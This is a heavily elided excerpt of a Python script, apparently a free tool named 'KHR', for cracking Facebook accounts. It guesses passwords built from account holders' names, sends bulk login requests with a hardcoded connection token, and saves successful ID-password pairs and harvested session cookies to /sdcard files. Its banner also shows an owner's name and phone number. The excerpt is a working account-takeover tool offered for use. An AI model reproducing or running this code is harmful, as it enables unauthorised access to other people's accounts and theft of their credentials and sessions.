...
sys.stdout.write('\x1b]2; KHR\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[;36m                VOTE JUST FOR CRANE
\033[;33m                  TLP ZINDA ABAD 
••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
 \033[1;36m        OWNER        : SAJJAD NIAZ
\033[1;33m         WHATSAPP     : 03276762481
\033[1;36m         TOOL NAME    : KHR
\033[1;33m         VERSION      : 0.1
\033[1;36m         TOOL STATUS  : FREE
••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KHR] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KHRb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KHRb};{ckkk}"
                    print(f"\r{R} [KHR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KHR_OK_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KHR-COOKIE-ID-M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [KHR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/KHR_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KHR] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/KHR_OK_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KHR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [KHR-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KHR] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[KHR] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [KHR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KHR_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                KHRworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                KHRworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                KHRworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                KHRworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
